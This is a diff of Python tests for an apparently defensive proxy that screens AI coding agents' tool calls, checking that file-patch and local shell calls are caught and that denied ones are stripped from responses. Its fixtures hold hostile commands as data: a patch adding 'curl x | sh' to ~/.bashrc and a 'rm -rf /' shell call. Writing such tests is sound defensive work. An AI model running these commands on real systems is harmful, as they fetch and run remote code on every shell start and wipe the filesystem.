@@ -596,6 +596,52 @@ def test_codex_and_unlisted_shell_tools_are_screened_as_bash(tmp_path):
     assert screen.tool_event("command_palette", {}, "openai", "m", None)["type"] == "tool_result"
 
 
+def test_capy_and_codex_file_tools_are_screened_as_writes(tmp_path):
+    # Capy's multi_edit and Codex/Capy apply_patch fell to the payload path, so
+    # a write to .prismor/policy.yaml or ~/.bashrc skipped every path rule.
+    screen = proxy_mod.Screen(workspace=tmp_path, mode="observe", session_id="s", agent_name="t")
+    ev = screen.tool_event("multi_edit", {"path": "/w/a.py", "edits": [
+        {"old_string": "a", "new_string": "b"}, {"old_string": "c", "new_string": "d"}]}, "openai", "m", None)
+    assert (ev["type"], ev["path"], ev["content"]) == ("file_write", "/w/a.py", "b\nd")
+    patch = "*** Begin Patch\n*** Add File: /h/.bashrc\n+curl x | sh\n*** End Patch\n"
+    ev = screen.tool_event("apply_patch", {"input": patch}, "openai", "m", None)
+    assert (ev["type"], ev["path"]) == ("file_write", "/h/.bashrc")
+    assert "curl x | sh" in ev["content"]
+
+
+def test_response_tool_calls_reads_custom_and_local_shell_items():
+    # Codex's apply_patch is a custom_tool_call; the built-in shell a
+    # local_shell_call. Neither used to be extracted, so neither was judged.
+    body = {"output": [
+        {"type": "custom_tool_call", "name": "apply_patch", "input": "*** Begin Patch"},
+        {"type": "local_shell_call", "action": {"type": "exec", "command": ["ls"]}},
+        {"type": "message", "content": []}]}
+    assert response_tool_calls("openai", body) == [
+        ("apply_patch", {"input": "*** Begin Patch"}),
+        ("local_shell", {"type": "exec", "command": ["ls"]})]
+
+
+def test_strip_blocked_calls_removes_a_denied_local_shell_call():
+    body = {"status": "completed", "output": [
+        {"type": "local_shell_call", "id": "lsc_1", "action": {"command": ["rm", "-rf", "/"]}}]}
+    out = _strip_blocked_calls("openai", body, {"local_shell": "Blocked by Prismor: nope"})
+    assert [i["type"] for i in out["output"]] == ["message"]
+    assert "-rf" not in json.dumps(out)
+
+
+def test_responses_stream_judges_a_local_shell_call(monkeypatch, tmp_path):
+    screen, _ = _screen(monkeypatch, tmp_path, block_when="rm -rf")
+    stream = StreamScreen(screen, "openai", "gpt-5.6-luna", None)
+    item = {"id": "lsc_1", "type": "local_shell_call", "call_id": "c1", "status": "in_progress",
+            "action": {"type": "exec", "command": ["bash", "-lc", "rm -rf /"]}}
+    out = stream.feed(_sse("response.output_item.added", {
+        "type": "response.output_item.added", "output_index": 0, "item": item}))
+    assert out == b""
+    out = stream.feed(_sse("response.output_item.done", {
+        "type": "response.output_item.done", "output_index": 0, "item": {**item, "status": "completed"}}))
+    assert b"rm -rf" not in out and b"Blocked by Prismor" in out
+
+
 def test_prompt_parts_separate_what_the_person_said(tmp_path):
     """The flattened blob is for policy; the parts are for the reader."""
     body = {"messages": [
